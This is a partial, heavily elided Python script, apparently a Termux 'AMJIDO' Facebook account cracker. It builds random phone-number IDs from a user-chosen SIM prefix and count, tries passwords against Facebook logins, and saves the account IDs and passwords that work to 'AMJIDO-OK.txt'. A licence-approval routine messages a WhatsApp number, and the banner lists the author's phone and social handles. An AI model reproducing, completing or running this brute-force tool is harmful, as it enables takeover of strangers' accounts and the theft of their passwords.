...
os.system('xdg-open https://www.facebook.com/profile.php?id=100083340051856&mibextid=ZbWKwL')
print('\n\033[1;37m MR AMJIDO HKR TOOLS UPDATE...\n NICE CLONER...')
import uuid
...
logo=("""
\033[1;91m 
 ______   __       __     _____  ______  _______    ______  
 /      \ /  \     /  |   /     |/      |/       \  /      \ 
/$$$$$$  |$$  \   /$$ |   $$$$$ |$$$$$$/ $$$$$$$  |/$$$$$$  |
$$ |__$$ |$$$  \ /$$$ |      $$ |  $$ |  $$ |  $$ |$$ |  $$ |
$$    $$ |$$$$  /$$$$ | __   $$ |  $$ |  $$ |  $$ |$$ |  $$ |
...
\x1b[1;92F---------------------------------------------------
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m AUTHOR     \x1b[1;97m: \x1b[1;97m AMJIDO KING OF TERMUX
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m FACEBOOK   \x1b[1;97m: \x1b[1;97m BAD AMALA AMJIDO
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m WHATSAPP   \x1b[1;97m: \x1b[1;97m +      93787235233
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m TAME       \x1b[1;97m: \x1b[1;97m AMJIDO&SAHENO&JAMILVISAL
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m Telegram   \x1b[1;97m: \x1b[1;97m BAD AMJIDO
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m  AMJIDO KING
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m VERSION    \x1b[1;97m:\x1b[1;97m  11.3   
\x1b[1;92m----------------------------------------------------    """)
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open https://wa.me/qr/YQCHEDUPF3WAB1')
	if riaz1 =='3':
		os.system('xdg-open https://wa.me/qr/YQCHEDUPF3WAB1');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def bangla():
	os.system('clear')
	print(logo)
	print('[1] AMJIDO Crack \x1b[1;92mM 1')
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[AMJIDO] Example  : 070,079,078,077')
    print('\x1b[1;92m[AMJIDO] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[AMJIDO] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[AMJIDO] Example  : 2000,3000,5000,10000')
    print('\x1b[1;92m[AMJIDO] See Note : PUT LEMIT ')
    lines()
    limit = int(input('[AMJIDO] Idz Lemit : '))
    print(46*'-')
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('[AMJIDO] Example  : 070,078,077,****Etc')
    print('\x1b[1;92m[AMJIDO] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[AMJIDO] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[AMJIDO] Example  : 5000,100000,10000')
    print('\x1b[1;92m[AMJIDO] See Note : PUT LEMIT ')
    lines()
    limit = int(input('[AMJIDO] Idz Lemit : '))
    print(46*'-')
...
def m3():
    ...
    os.system('clear')
    print(logo)
    print('[AMJIDO] Example  : 9370,9378,9377,****Etc')
    ...
    os.system('clear')
    print(logo)
    print('[AMJIDO] Example  : 2000,3000,5000,Afghan')
    print('\x1b[1;92m[AMJIDO] See Note : PUT LEMIT ')
    lines()
    limit = int(input('[AMJIDO] Idz Lemit : '))
    print(46*'-')
...
def b1():
    ...
    os.system('clear')
    print(logo)
    print('[AMJIDO] Example  : 0306,92***,92***,')
    print('\x1b[1;92m[+] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[AMJIDO] Your Code : ')
    lines()
    ...
    lines()
    limit = int(input('[AMJIDO] YOUR LEMIT : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
...
def b2():
    ...
    os.system('clear')
    print(logo)
    print('[AMJIDO] Example  : 92***,92***,92***,')
    print('\x1b[1;91m[AMJIDO] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[AMJIDO] Your Code : ')
    lines()
    os.system('clear')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AMJIDO-OK] '+cid+' | '+ps+'\033[0;97m')
                open('AMJIDO-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mAMJIDO\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('AMJIDO%20!%20🄿lease%20🄰pprove%20🄼y%20🄺ey%20🅃he%20🄺ey%20Is%20:%20'+id);os.system('am start https://wa.me/+93774274528?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
